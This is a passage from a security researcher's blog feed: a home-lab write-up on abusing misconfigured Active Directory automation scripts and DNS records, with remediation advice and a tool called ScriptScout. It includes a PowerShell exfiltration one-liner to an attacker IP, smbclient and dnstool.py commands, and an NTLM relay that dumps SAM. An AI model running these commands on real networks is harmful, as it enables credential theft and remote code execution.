+<p><strong>Append</strong> (DO NOT remove data contained within / DO NOT overwrite the file content – this would cause a service disruption) <strong>the malicious content, for example the following arbitrary code:</strong></p>
+<pre tabindex="0"><code>powershell -Command &#34;$data = (whoami) + &#39;|&#39; + (hostname); $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($data)); Invoke-WebRequest -Uri \&#34;http://&lt;ip_attacker&gt;/?a=$encoded\&#34; -UseBasicParsing&#34;
+</code></pre>
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/28.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+<p>This code executes the “whoami” and “hostname” commands and sends the output in base64 format to a Web Server hosted by the attacker, in reality the attacker could create local accounts on the machine (if the impersonated user has sufficient privileges), spawn a Reverse Shell, execute a beacon to establish a connection to the C2 and so on.</p>
+<blockquote>
+<p>The syntax of the arbitrary command to be inserted inside the file to be modified varies according to the language it uses, for example if you modify a .VBS file, the code indicated above may not work.</p></blockquote>
+</li>
+<li>
+<p><strong>We use, for example, “smbclient” to finally upload and thus overwrite the original “Automation Script” with the malicious “Automation Script”.</strong></p>
+<pre tabindex="0"><code># smbclient //&lt;hostname-ip_dc&gt;/SYSVOL -U &#39;&lt;domain&gt;\\&lt;domain_user&gt;%&lt;password&gt;&#39; -c &#34;put &lt;local_file&gt;/&lt;automationscript_name&gt; &lt;fullpath_automationscript&gt;&#34;
+</code></pre>
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/29.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+</li>
+</ol>
+<p>Now, if the domain user (<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#17">we know that this &ldquo;Logon Script&rdquo; is associated exclusively with this domain user</a>) named &ldquo;MARVEL\pparker&rdquo; logs on (Logon) to any domain-joined machine, as in this case SPIDERMAN, the machine, impersonating the domain user &ldquo;MARVEL\pparker&rdquo;, will execute the &ldquo;LogonScript&rdquo; &ldquo;misc4_logonscript.ps1&rdquo; and consequently will execute the malicious code inside it, and in fact, as a result of this event, we could observe that the attacker actually succeeded in exfiltrating data.</p>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/30.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>To see how everything was configured inside the home made lab, refer to the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#13">previous section</a> since the configuration was almost the same.</p>
+<p><strong>Remediation</strong>: Analyze if there are excessive permissions assigned to the &ldquo;Automation Scripts&rdquo; itself or in its parent folder (e.g. &ldquo;Script&rdquo; folder) / SMB Share (e.g. NETLOGON) that contain it, if excessive permissions are present, an attacker could exploit them to carry out an SMISC4 attack.</p>
+<span id=26>
+<h2 id="smisc5-find-a-script-that-map-a-smb-share---or-execute-a-remote-file-hosted-on-a-smb-share-where-the-machine-that-expose-that-smb-share-does-not-exist-anymore"><strong>SMISC5: Find a Script that map a SMB share &amp; / OR execute a remote file hosted on a SMB Share, where the machine that expose that SMB Share does not exist anymore</strong></h2>
+<p>Sometimes it may happen that the Automation Script contains code that maps a network SMB share or executes a remote file hosted on a network SMB share where the machine exposing such SMB share no longer exists, this may occur because over time sysadmin decide to deprecate the machine and remove it from the infrastructure while leaving the corresponding Automation Script pointing to it.</p>
+<p>Since by default every principal within the &ldquo;Authenticated Users&rdquo; group (each Domain User &amp; each Computer Account) has permissions to create DNS records within the domain (including users with minimal privileges), an attacker could create a DNS record that points to an IP address associated with a machine owned by the attacker, which will have an appropriately configured SMB share reachable by the victim; by doing this, when the victim executes the Automation Script it will perform a NTLM authentication (since Kerberos will fail and then the switch will occur via failover) towards the SMB service exposed on the attacker&rsquo;s machine, and as a result of this the attacker will be able to perform an attack such as <a href="https://en.hackndo.com/ntlm-relay/">NTLM Relay</a> (for example an SMB Relay) or <a href="https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#cracking-ntlmv2">Net-NTLM Hash Cracking</a>.</p>
+<p>Before proceeding with the attack i want to highlight that based on the type (<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#6">e.g. Logon Script, StartUp Script and so on</a>) of the vulnerable &ldquo;Automation Script,&rdquo; the impact of the SMISC5 technique will vary in severity (regardless if it&rsquo;s configured via <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">GPO - Group Policy Script</a> or <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#2">ScriptPath property</a>), specifically:</p>
+<ul>
+<li>
+<p><strong>LogOn Script</strong>: Following a &ldquo;Logon&rdquo;, the Computer impersonates the domain user to perform network authentication (by default Kerberos, NTLM in case of failover) to the target SMB share, subsequently the Computer will perform the desired action locally (map the SMB share locally / execute the remote file present on the SMB share locally) always impersonating the domain user.</p>
+<p>In the SMISC5 scenario, this means that the Computer will send an NTLM authentication request (since Kerberos fails) with the victim user and as a result the attacker will obtain the Net-NTLM Hash of the domain user, so the attacker will have concrete opportunities to successfully perform NTLM Relay &amp; Net-NTLM Hash Cracking.</p>
+</li>
+<li>
+<p><strong>LogOff Script</strong>: Following a &ldquo;Logoff&rdquo;, the Computer impersonates the domain user to perform network authentication (by default Kerberos, NTLM in case of failover) to the target SMB share, subsequently the Computer will perform the desired action locally (map the SMB share locally / execute the remote file present on the SMB share locally) always impersonating the domain user.</p>
+<p>In the SMISC5 scenario, this means that the Computer will send an NTLM authentication request (since Kerberos fails) with the victim user and as a result the attacker will obtain the Net-NTLM Hash of the domain user, so the attacker will have concrete opportunities to successfully perform NTLM Relay &amp; Net-NTLM Hash Cracking.</p>
+</li>
+</ul>
+<span id=25>
+<ul>
+<li>
+<p><strong>StartUp Script</strong>: Following a &ldquo;StartUp&rdquo;, the Computer uses its own &ldquo;Computer Account&rdquo; to perform network authentication (by default Kerberos, NTLM in case of failover) to the target SMB share, subsequently the Computer will perform the desired action locally (map the SMB share locally / execute the remote file present on the SMB share locally) impersonating the local user &ldquo;NT Authority\ System&rdquo;.</p>
+<p>In the SMISC5 scenario, this means that the Computer will send an NTLM authentication request (since Kerberos fails) with its own Computer Account and as a result the attacker will obtain the Net-NTLM Hash of the Computer Account, so the attacker will have virtually no chances of successfully performing Net-NTLM Hash Cracking (since by default the Computer Account password is extremely strong) and fewer opportunities for exploitation via NTLM Relay.</p>
+</li>
+<li>
+<p><strong>ShutDown Script</strong>: Following a &ldquo;ShutDown&rdquo;, the Computer uses its own &ldquo;Computer Account&rdquo; to perform network authentication (by default Kerberos, NTLM in case of failover) to the target SMB share, subsequently the Computer will perform the desired action locally (map the SMB share locally / execute the remote file present on the SMB share locally) impersonating the local user &ldquo;NT Authority\ System&rdquo;.</p>
+<p>In the SMISC5 scenario, this means that the Computer will send an NTLM authentication request (since Kerberos fails) with its own Computer Account and as a result the attacker will obtain the Net-NTLM Hash of the Computer Account, so the attacker will have virtually no chances of successfully performing Net-NTLM Hash Cracking (since by default the Computer Account password is extremely strong) and fewer opportunities for exploitation via NTLM Relay.</p>
+<blockquote>
+<p>Automation Scripts executed via &ldquo;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#3">GPO Scheduled Task</a>&rdquo; may differ significantly depending on how they are configured.</p></blockquote>
+</li>
+</ul>
+<span id=24>
+<p><strong>In summary, SMISC5 will have a greater impact if the affected Automation Script is a &ldquo;Logon Script&rdquo; or a &ldquo;LogOff Script&rdquo;, with the exception of particular scenarios that will be addressed <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#22">later</a>.</strong></p>
+<p>By running ScriptScout, we can observe how an Automation Script attempts to execute the remote file &ldquo;run.bat&rdquo; located on the SMB share named &ldquo;business_folder&rdquo; hosted on the machine &ldquo;notexistcomputer&rdquo;, since this machine is no longer present (there is no longer an associated DNS A record), an attacker could first insert a malicious DNS A record in the target domain to associate the machine &ldquo;notexistcomputer&rdquo; with the attacker&rsquo;s IP address, then expose a CIFS service on their malicious machine with the SMB share named &ldquo;business_folder&rdquo; and once these preliminary actions have been completed, when the victim through the Automation Script authenticates using NTLM to the computer &ldquo;notexistcomputer&rdquo;, the attacking machine will receive the Net-NTLM Hash and will be able to perform an NTLM-Relay attack or Net-NTLM Hash cracking.</p>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/31.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Additionally, ScriptScout will display on screen the corresponding &ldquo;Automation Script&rdquo; that contains the execution of the remote file or mapping of the remote SMB share hosted on the machine that no longer exists, in this case by viewing the path <code>\\&lt;dc-hostname&gt;\policies\&lt;GUID&gt;\User\Script\Logoff</code> we understand that this &ldquo;Automation Script&rdquo; named &ldquo;smisc5_automationscript.ps1&rdquo; is actually a LogOff Script configured through <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">GPO (Group Policy Script)</a></p>
+<span id=20>
+<p>Subsequently, to determine which users are impacted by this &ldquo;Automation Script&rdquo; (in this case Logoff Script) and therefore identify the potential victims of the SMISC5 attack, <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#5">as previously mentioned</a>, the tester must enumerate this information manually for example using BloodHound; since the target in this example is within my home laboratory, we can observe how this GPO with that GUID is actually named &ldquo;smisc5_automationscript&rdquo; (DisplayName) and is directly associated with the MARVEL.local domain, it means that ALL domain user (because it is a Logoff Script) that perform a &ldquo;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#19">Logoff</a>&rdquo; will become the victims of this attack.</p>
+<span id=21>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/32.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<blockquote>
+<p>If the Automation Script vulnerable to SMISC5 is located inside <code>\\&lt;dc-hostname&gt;\SYSVOL\Scripts\&lt;SMISC5_vulnerable_filename&gt;</code>, this means that such Automation Script can be executed either through the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#2">&ldquo;ScriptPath&rdquo; property</a> of a domain user or through a <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#3">GPO Scheduled Task</a>, in the first instance the attacker will need to manually retrieve and correlate data to understand which user is impacted <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#20">in a manner similar to what has already been described</a>, in the second case, since ScriptScout also downloads all &ldquo;ScheduledTask.xml&rdquo; files inside the &ldquo;ScheduledTaskConf_collected&rdquo; folder, the attacker by running a grep can quickly identify if such &ldquo;Automation Script&rdquo; vulnerable to SMISC5 is triggered via &ldquo;GPO Scheduled Task&rdquo;, in this scenario by analyzing the identified &ldquo;ScheduledTask.xml&rdquo; file it will also be possible to understand the execution logic (e.g. trigger &ldquo;On Workstation Lock&rdquo;) and with which user the vulnerable Automation Script will be executed.</p></blockquote>
+<p>Knowing this, the attacker could, for example, use the tool <a href="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py">&ldquo;dnstool.py&rdquo;</a> to insert a DNS A record that will point the machine name &ldquo;notexistcomputer&rdquo; to the IP address belonging to the attacker&rsquo;s machine.</p>
+<pre tabindex="0"><code># python3 /opt/krbrelayx/dnstool.py -u &lt;domain&gt;\\&lt;user&gt; -p &lt;password&gt; -r &lt;notexistmachine_fqdn&gt; -t A -d &lt;IP_AttackerComputer&gt; --action add &lt;IP_DC&gt;
+</code></pre>
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/33.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>Once the tool has responded positively, the malicious DNS A record has been successfully inserted.</p>
+<blockquote>
+<p>It is necessary to wait a few minutes for the change to propagate, after waiting, you can confirm the successful insertion of the record as follows:</p>
+<pre tabindex="0"><code># dig @&lt;dc_ip&gt; &lt;notexistmachine_fqdn&gt; A +short
+</code></pre>
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/34.png"  class="center"  style="border-radius: 8px;"  />
+
+</blockquote>
+<span id=23>
+<p>In our scenario, since this is a homemade lab, we will simulate the logoff interaction of the user &ldquo;MARVEL\pparker&rdquo; (it&rsquo;s a Domain Admin) on the machine SPIDERMAN; consequently we will configure the tool <a href="https://github.com/fortra/impacket/blob/9c2d8b61ee9f13dc93744f36748bd4f49a5e9bd5/examples/ntlmrelayx.py#L4">&ldquo;impacket-ntlmrelayx&rdquo;</a> to perform an SMB Relay towards the machine THEPUNISHER (since it&rsquo;s a Windows 10 by default it does NOT have the SMB Signing enabled and therefore the attack will work), specifically towards the IP 192.168.52.132 (THEPUNISHER) and also configure it to save the Net-NTLM Hash obtained, which may potentially be used to perform Net-NTLM Hash Cracking afterward.</p>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/35.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Now, <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#23">as previously mentioned</a>, if for example the user &ldquo;MARVEL\pparker&rdquo; (<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#21">since this is a home lab we know that this user has this Logon Script configured, like every domain user in the domain</a>) logs off from the SPIDERMAN machine, the machine impersonating the domain user &ldquo;MARVEL\pparker&rdquo; will execute the LogOff Script &ldquo;smisc5_automationscript.ps1&rdquo;, consequently, still impersonating the user &ldquo;MARVEL\pparker&rdquo;, will perform an NTLM authentication (Kerberos is attempted first but upon failure a new attempt is made using NTLM) towards the machine &ldquo;notexistcomputer&rdquo; which will have the attacker&rsquo;s machine IP associated, for this reason the attacker&rsquo;s machine will receive the Net-NTLM Hash of the user &ldquo;MARVEL\pparker&rdquo; and will perform an NTLM Relay towards the machine THEPUNISHER dumping in this way the SAM of the latter (this is because &ldquo;MARVEL\pparker&rdquo; has the necessary permissions).</p>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/36.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><strong>Remediation</strong>: Analyze all &ldquo;Automation Scripts&rdquo; present in the infrastructure and check if the referenced SMB shares are hosted on a machine that has been decommissioned; if such occurrence happens an attacker could perform the attack type called SMISC5.</p>
+<span id=22>
+<h2 id="smisc5---deep-dive-into-an-exploitation-edge-case"><strong>SMISC5 - Deep Dive into an exploitation Edge Case</strong></h2>
+<p><a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#24">As previously discussed</a>, an SMISC5 on a StartUp &amp; Shutdown Script has a lower impact compared to its Logon &amp; LogOff Script counterpart, because the attacker obtaining a Net-NTLM Hash of a Computer Account has less attack surface.</p>
+<p>In order to scale the severity of this scenario (and in reality also on Logon &amp; Logoff Scripts), i asked myself: instead of simply obtaining the Net-NTLM Hash which can only be used for NTLM Relay &amp; Net-NTLM Hash Cracking, if there is a scenario where an Automation Script executes a file located on a remote SMB share vulnerable to SMISC5, an attacker could instead host an SMB File Share containing a malicious file where both have the exact same name as what is called by the victim through the Automation Script, if so, the victim will retrieve and then execute the malicious file hosted by the attacker, in this way the attacker would indirectly execute arbitrary commands by impersonating the victim; furthermore, this scenario would be even more severe in the case of a StartUp &amp; Shutdown Script since the execution of the malicious file <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#25">will be performed locally on the machine while impersonating the &ldquo;NT Authority\System&rdquo; account</a>.</p>
+<p>Unfortunately (for the attacker), in order to successfully conduct such an attack, it is necessary that the computer performing NTLM Authentication against the SMB service hosted by the attacker has <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3?tabs=group-policy#reason-for-enabling-guest-logons">&ldquo;Guest&rdquo; SMB Authentication enabled</a>, which is a configuration that is <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3?tabs=group-policy#default-behaviors">by default disabled on &gt;= Windows 10 &amp; Windows 2019</a>; consequently, if the attacker identifies a GPO StartUp / Shutdown Script vulnerable to SMISC5 that is associated with an OU containing only Windows Server &lt; 2019, or if the attacker verifies that the computers affected by an SMISC5 also have a <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3?tabs=group-policy#enable-insecure-guest-logons">GPO that enables &ldquo;Guest Authentication&rdquo;</a> on them, this edge case becomes realistic.</p>
+<p>As we can observe in this scenario, the machine &ldquo;SPIDERMAN&rdquo; has been specifically configured with &ldquo;Insecure Guest Logon&rdquo; enabled:</p>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/37.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>And there is a GPO associated with the entire domain that runs a Shutdown script which specifically executes the file &ldquo;run.bat&rdquo; located at <code>\\notexistcomputer\business_folder\management_files\run.bat</code>, furthermore, i want to highlight that this Automation Script is vulnerable to <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#26">SMISC5</a> as previously discussed and in fact in this example for semplicity reason there is already an DNS A record that points the hostname &ldquo;notexistcomputer&rdquo; to the IP address of the attacker&rsquo;s machine.</p>
+<span id=27>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/38.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>In this scenario, the attacker can use <a href="https://github.com/fortra/impacket/blob/master/examples/smbserver.py">&ldquo;smbserver.py&rdquo; from Impacket</a> to set up an SMB share named &ldquo;business_folder&rdquo; where inside it there is a folder called &ldquo;management_files&rdquo; containing the file &ldquo;run.bat&rdquo; with the malicious PAYLOAD (e.g. it performs an HTTP Exfiltration), in other words the file is located exactly in the path called by the Automation Script vulnerable to SMISC5 named &ldquo;smisc5_automationscript.ps1&rdquo;.</p>
+<blockquote>
+<p>In this example we perform a basic HTTP Exfiltration attack but in reality since in this scenario the computer victim will execute locally the malicious file using the &ldquo;NT Authority\System&rdquo;, the attacker could for example create local administrator user on the machine, dump LSASS, dump SAM, dump LSA Secrets, execute a beacon to establish a connection to the C2 and so on.</p></blockquote>
+<p>At the moment when the SPIDERMAN machine (<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#27">we know that every machine joined to the domain is impacted</a>) performs a Shutdown, the following operations occur sequentially:</p>
+<ol>
+<li>
+<p>The SPIDERMAN computer executes the Automation Script &ldquo;smisc5_automationscript.ps1&rdquo; and consequently decides to execute the file &ldquo;run.bat&rdquo; located at the following path: <code>\\notexistcomputer\business_folder\management_files\run.bat</code>.</p>
+</li>
+<li>
+<p>The SPIDERMAN computer resolves the hostname &ldquo;notexistcomputer&rdquo; to the IP &ldquo;192.168.52.133&rdquo; which belongs to the attacker.</p>
+</li>
+<li>
+<p>The SPIDERMAN computer uses its own Computer Account named SPIDERMAN$ to perform a Kerberos authentication to the SMB service exposed on the machine &ldquo;192.168.52.133&rdquo;.</p>
+</li>
+<li>
+<p>Since the exposed SMB service does NOT accept Kerberos authentication, the SPIDERMAN computer, due to failover reasons, performs a NTLM network authentication using its own Computer Account named SPIDERMAN$, consequently the attacker&rsquo;s machine correctly receives the Net-NTLM Hash of SPIDERMAN$.</p>
+</li>
+<li>
+<p>Since the SMB service on the attacker&rsquo;s machine is NOT able to verify the validity of the Net-NTLM Hash of SPIDERMAN$ as it&rsquo;s a service set up by an attacker (normally the receiving legitimately machine would forward everything to the DC which would validate the Net-NTLM Hash and based on this would allow or deny access), it responds with an error.</p>
+</li>
+<li>
+<p>The SPIDERMAN machine, after receiving an error, since it&rsquo;s configurated to allow the use of the &ldquo;Guest User&rdquo;, as a last resort, it will try to authenticate to the SMB service of attacker&rsquo;s machine using the built-in &ldquo;Guest&rdquo; user.</p>
+</li>
+<li>
+<p>The SMB service exposed on the attacker&rsquo;s machine accepts the &ldquo;Guest&rdquo; authentication and consequently allows crawling of the SMB share and the retrieval of the file &ldquo;run.bat&rdquo;.</p>
+</li>
+<li>
+<p>The SPIDERMAN machine, having now retrieved the file &ldquo;run.bat&rdquo;, executes it locally using the &ldquo;NT Authority\System&rdquo; account and consequently runs the malicious code.</p>
+</li>
+</ol>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/39.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><strong>Remediation</strong>: Always keep &ldquo;<a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3?tabs=group-policy">Insecure Guest Logon</a>&rdquo; disabled, if enabled, it will increase the severity of an potentially SMISC5 attack.</p>
+<span id=34>
+<h2 id="scriptscout-tips--tricks"><strong>ScriptScout Tips &amp; Tricks</strong></h2>
+<p><strong>In this section, i will detail some Tips &amp; Tricks on how to use ScriptScout according to your professional role within your company:</strong></p>
+<p><strong>Red Team (e.g. Red Teamer, Penetration Tester, Security Researcher):</strong></p>
+<ul>
+<li>
+<p>ScriptScout has a parameter dedicated to OPSEC (&ndash;opsec), specifically, through its configuration, it is possible to set a longer sleep activity before each interaction with the Domain Controller and not only (querying the Domain Controller’s SYSVOL or NETLOGON share is a standard activity, so fortunately for Red Team it’s should be pretty OPSEC-safe, especially with delays).</p>
+</li>
+<li>
+<p>In order to download the Automation Scripts and the &ldquo;ScheduledTask.xml&rdquo; files from Domain Controller ScriptScout uses the &ldquo;SMBConnection&rdquo; library by Impacket, for this reason the network activity triggered could be identified by the signatures / IOC generated by such library (typically <a href="https://blog.exploit.org/caster-kerbhammer/">Impacket network signatures / IOC</a> generated by a vendor focus only on Kerberos interactions and not on NTLM - ScriptScout will exclusively use NTLM); furthemore, i want to highlight that ScriptScout, to identify remote NTFS permissions under-the-hood will use <a href="https://www.samba.org/samba/docs/current/man-html/smbcacls.1.html">smbcacls</a> from the Samba suite.</p>
+</li>
+<li>
+<p>Regarding SMISC2, SMISC3 and SMISC4, ScriptScout will also specify to which group the excessive permissions have been assigned, namely: &ldquo;Everyone&rdquo; or &ldquo;Domain Users&rdquo;, &ldquo;Authenticated Users&rdquo; and &ldquo;Domain Computers&rdquo;; this logic is deliberately implemented as it gives more flexibility to the Red Teamer, for example in a &ldquo;Authenticated Users&rdquo; scenario the Red Teamer could impersonate a Computer Account instead of the regular Domain User to perform the exploitation.</p>
+</li>
+<li>
+<p>The output of SMISC2 and SMISC3 depends on where the Red Teamer executes ScriptScout, consequently, if full visibility of these misconfigurations is needed, it is recommended to run ScriptScout multiple times from different locations within the network although this is less OPSEC-friendly; for this purpose, i suggest to use the &ldquo;&ndash;technique&rdquo; parameter to avoid unnecessary and additional requests to the client’s infrastructure.</p>
+</li>
+</ul>
+<p><strong>Blue Team (e.g. SysAdmin, SIEM / Detection Engineer, CyberSecurity Analyst):</strong></p>
+<ul>
+<li>
+<p>Using ScriptScout you will be able to immediately identify all the SMISC present in your infrastructure, then you can apply the necessary fixes!</p>
+</li>
+<li>
+<p>SMISC2 and SMISC3 depend on the position from where the Blue Team will execute ScriptScout, consequently, it&rsquo;s recommended to run it directly on the Domain Controller so that you can be sure to have connectivity to all machines joined to the domain.</p>
+</li>
+<li>
+<p>By disabling the OPSEC mechanisms (using the &ldquo;&ndash;opsec&rdquo; parameter) which ScriptScout enables by default, execution will be significantly faster, instead, configuring the parameter to maximize OPSEC allows ScriptScout to be used to test if the detection rules deployed in your infrastructure work properly and can detect anomalous traffic.</p>
+</li>
+</ul>
+<span id=35>
+<h2 id="outro"><strong>Outro</strong></h2>
+<p>It’s been a really interesting journey, what started as reading an <a href="https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/">awesome article about misconfigured logon scripts</a> (made by <a href="https://x.com/techspence">Spencer Alessi</a>) morphed into a deep dive on the topic which led me to write this article and create the ScriptScout tool, so, if this article sparks any new SMISC exploitation ideas or any variations in your mind, hit me up, let’s do community &amp; research together!</p>
+<span id=36>
+<h2 id="references"><strong>References</strong></h2>
+<ul>
+<li><a href="https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/">https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/</a></li>
+<li><a href="https://github.com/techspence/scriptsentry">https://github.com/techspence/scriptsentry</a></li>
+<li><a href="https://www.semperis.com/blog/gpo-logon-script-security/">https://www.semperis.com/blog/gpo-logon-script-security/</a></li>
+<li><a href="https://www.blackhillsinfosec.com/backdoors-breaches-logon-scripts/">https://www.blackhillsinfosec.com/backdoors-breaches-logon-scripts/</a></li>
+<li><a href="https://www.youtube.com/watch?v=j1hMPZfy9aM">How to execute logon and logoff scripts using Group Policy Objects (GPO) - Active Directory (AD)</a></li>
+<li><a href="https://www.youtube.com/watch?v=CGHyAD0ylRs">How to execute logon/logoff scripts using group policy</a></li>
+<li><a href="https://ad4noobs.justin-p.me/terminology_installing_a_active_directory/sysvol_and_netlogon/">https://ad4noobs.justin-p.me/terminology_installing_a_active_directory/sysvol_and_netlogon/</a></li>
+<li><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn789196%28v=ws.11%29">https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn789196(v=ws.11)</a></li>
+</ul>
+]]></content></item><item><title>Demystify Kerberos Delegation Attacks</title><link>https://marcozufferli.com/posts/demystify_kerberos_delegation_attacks/</link><pubDate>Fri, 26 Sep 2025 14:56:19 +0200</pubDate><guid>https://marcozufferli.com/posts/demystify_kerberos_delegation_attacks/</guid><description>Hands-on explanation of Kerberos delegation exploitation techniques and pragmatic detection and hardening advice for defenders.</description><content type="html"><![CDATA[<hr>
 <h4 id="table-of-contents">Table of Contents:</h4>
 <ul>
 <li><a href="/posts/demystify_kerberos_delegation_attacks/#abuse-unconstrained-delegation-computer">Abuse Unconstrained Delegation</a>
